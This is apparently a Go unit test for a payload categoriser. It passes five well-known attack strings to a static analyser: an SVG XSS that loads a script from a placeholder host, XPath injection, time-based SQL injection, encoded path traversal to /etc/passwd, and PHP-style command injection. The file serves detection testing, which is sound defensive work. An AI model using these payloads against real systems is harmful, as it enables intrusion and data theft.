package tests

import (
	"categorizer/analysis"
	"categorizer/retrieve"
	"context"
	"testing"
)

func TestStaticAnalyser(t *testing.T) {
	ctx := context.Background()
	address := "http://localhost:8000"
	results := make(chan analysis.StaticAnalysisResult)

	//fmt.Printf("%s\n", os.Getenv("HF_API_KEY"))

	analyser, err := analysis.NewChromaAnalyser(ctx, address)
	if err != nil {
		t.Errorf("Error creating analyser: %v", err)
	}

	var tests [5]retrieve.Result
	tests[0] = retrieve.Result{Stream: "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>", SrcPort: 9999}
	tests[1] = retrieve.Result{Stream: "admin' and substring(password/text(),1,1)='7", SrcPort: 1234}
	tests[2] = retrieve.Result{Stream: "'))) and 0=benchmark(3000000,MD5(1))%20--", SrcPort: 46525}
	tests[3] = retrieve.Result{Stream: "/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd", SrcPort: 2222}
	tests[4] = retrieve.Result{Stream: ";system('/usr/bin/id')", SrcPort: 8080}

	for _, test := range tests {
		go analyser.Analyse(ctx, test, results)
		select {
		case res := <-results:
			t.Log("Risultato: ", res)
		}
	}
	close(results)
	return
}
